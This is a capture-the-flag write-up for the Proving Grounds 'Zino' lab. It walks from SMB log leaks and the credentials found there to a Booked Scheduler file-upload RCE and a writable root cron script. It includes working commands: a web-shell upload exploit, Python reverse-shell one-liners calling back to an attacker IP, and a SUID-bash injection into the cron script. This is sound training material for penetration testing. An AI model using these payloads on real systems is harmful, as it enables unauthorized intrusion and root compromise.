# Zino - Proving Grounds Practice

> **Kill Chain Summary**:
> Full Port Scanning -> Anonymous SMB Share Enumeration (`zino`) -> System Log Analysis and Credential Harvesting (`admin:adminadmin`) -> Booked Scheduler v2.7.5 Authenticated File Upload RCE (Exploit 50594) -> Reverse Shell as `www-data` -> Crontab Enumeration (Root Cron Job `cleanup.py`) -> Insecure Permissions (`777`) on Script -> Python Code Injection -> Privilege Escalation to Root (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Zino |
| **Platform** | Proving Grounds Practice |
| **OS** | Linux |
| **Difficulty** | Intermediate |
| **Status** | Rooted |
| **Key Techniques** | Anonymous SMB Log Enumeration, Credential Disclosure, Booked Scheduler Authenticated RCE, Writable Root Cron Job Exploitation (`cleanup.py`) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap:

```bash
sudo nmap -p- --min-rate 1000 -T4 -Pn 192.168.195.64 -oA nmap/tcp_all
```

```text
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8003/tcp open  mcreport
```

Targeted version and script scan on all open ports:

```bash
sudo nmap -p 21,22,139,445,3306,8003 -sV -sC -Pn 192.168.195.64 -oA nmap/tcp_versions
```

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 10.3.24 or later (unauthorized)
8003/tcp open  http        Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.38 (Debian)
```

The scan identifies an Apache web server running on port 8003 hosting a directory named `booked/`.

### 1.2 Web Application Enumeration (Port 8003)

Browsing to `http://192.168.195.64:8003/booked/` reveals an instance of **Booked Scheduler v2.7.5**.

A test user account was registered through the self-registration interface. While Booked Scheduler v2.7.5 has known remote code execution vulnerabilities, the standard exploit path requires administrative credentials.

### 1.3 SMB Share Enumeration

Enumerating available SMB shares via null session:

```bash
smbclient -L //192.168.195.64/ -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        zino            Disk      Logs
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
```

Connecting to the `zino` share without credentials:

```bash
smbclient //192.168.195.64/zino -N
```

```text
smb: \> ls
  .                                   D        0
  ..                                  D        0
  .bash_history                       H        0
  error.log                           N      265
  .bash_logout                        H      220
  local.txt                           N       33
  .bashrc                             H     3526
  .gnupg                             DH        0
  .profile                            H      807
  misc.log                            N      424
  auth.log                            N      368
  access.log                          N     5464
  ftp                                 D        0

smb: \> mget *
```

The share exposes several system log files and the user flag `local.txt` directly.

Reading `local.txt`:

```bash
cat local.txt
```

```text
[FLAG REDACTED]
```

Inspecting `auth.log` reveals account creation history for a local user `peter`:

```bash
cat auth.log
```

```text
groupadd[1044]: new group: name=peter, GID=1001
useradd[1048]: new user: name=peter, UID=1001, GID=1001, home=/home/peter, shell=/bin/bash
passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
CRON[1058]: pam_unix(cron:session): session opened for user root by (uid=0)
```

Inspecting `misc.log` reveals cleartext credentials configured for the web application:

```bash
cat misc.log
```

```text
systemd[1]: Starting Clean php session files...
systemd[1]: Set application username "admin"
systemd[1]: Set application password "adminadmin"
```

The discovered credentials are:
- **Username:** `admin`
- **Password:** `adminadmin`

---

## 2. Initial Access

With administrative credentials in hand, Booked Scheduler v2.7.5 can be exploited via an authenticated arbitrary file upload vulnerability (CVE-2019-15821 / Exploit-DB 50594).

Running the exploit script against the target:

```bash
python3 50594.py "http://192.168.195.64:8003" admin adminadmin
```

```text
[+] Logged in successfully.
[+] Uploaded shell successfully
[+] http://192.168.195.64:8003/booked/Web/custom-favicon.php?cmd=
```

The web shell is established. To obtain an interactive reverse shell, trigger a callback to a Netcat listener. Using port 21 ensures outbound packets pass through egress network filters:

```bash
sudo nc -lvnp 21
```

Executing the reverse shell payload via the web shell parameter:

```bash
curl -G "http://192.168.195.64:8003/booked/Web/custom-favicon.php" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.185\",21));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
```

The listener catches the reverse shell:

```text
listening on [any] 21 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.195.64] 52410
www-data@zino:/var/www/html/booked/Web$ whoami
www-data
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Cron Jobs

Checking the system crontab `/etc/crontab`:

```bash
cat /etc/crontab
```

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

A cron job runs as `root` every 3 minutes executing `/var/www/html/booked/cleanup.py`.

Checking file permissions on `cleanup.py`:

```bash
ls -la /var/www/html/booked/cleanup.py
```

```text
-rwxrwxrwx 1 www-data www-data 164 /var/www/html/booked/cleanup.py
```

The script is world-writable (`777`) and owned by `www-data`.

### 3.2 Exploitation via Malicious Cron Script

Because the script is executed by `root` every three minutes, appending or overwriting it with a privileged command provides immediate elevation.

#### Method 1: SUID Binary Creation
Append a command to assign the SUID bit to `/bin/bash`:

```bash
echo -e "\nimport os\nos.system('chmod +s /bin/bash')" >> /var/www/html/booked/cleanup.py
```

Wait up to 3 minutes for cron execution, then verify permissions:

```bash
ls -la /bin/bash
-rwsr-sr-x 1 root root /bin/bash
```

Spawn a root shell:

```bash
/bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

#### Method 2: Reverse Shell
Configure a reverse shell payload within `cleanup.py`:

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.45.185", 21))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

Catch the connection on the listener as `root`:

```text
listening on [any] 21 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.195.64] 52418
# whoami
root
```

Retrieve the root flag:

```bash
cat /root/proof.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# SMB Share Listing and File Download
smbclient -L //192.168.195.64/ -N
smbclient //192.168.195.64/zino -N -c "mget *"

# Booked Scheduler Authenticated Exploit (50594.py)
python3 50594.py "http://<TARGET_IP>:8003" <USER> <PASSWORD>

# Inspect System Crontab
cat /etc/crontab

# Exploit Writable Cron Script via SUID
echo -e "\nimport os\nos.system('chmod +s /bin/bash')" >> /var/www/html/booked/cleanup.py
/bin/bash -p
```

---

## 5. Key Takeaways and Lessons Learned

1. **SMB Log Leaks:** System logs exposed over SMB shares often contain sensitive administrative operations, including user creation logs (`auth.log`) and initialization credentials (`misc.log`).
2. **Cron Job Audit:** Always inspect `/etc/crontab` and `/etc/cron.*` for recurring scripts. Any script executed by `root` with write permissions granted to low-privileged accounts or web services represents an immediate, high-probability privilege escalation vector.
3. **Operational Discipline with Cron Scripts:** When modifying scheduled task files, never delete the target script. Always create a backup and append or overwrite in place so the cron daemon continues invoking the expected file path without failure.

---

#proving-grounds #linux #intermediate #smb #credential-leak #booked-scheduler #cve-2019-15821 #crontab #suid #privesc
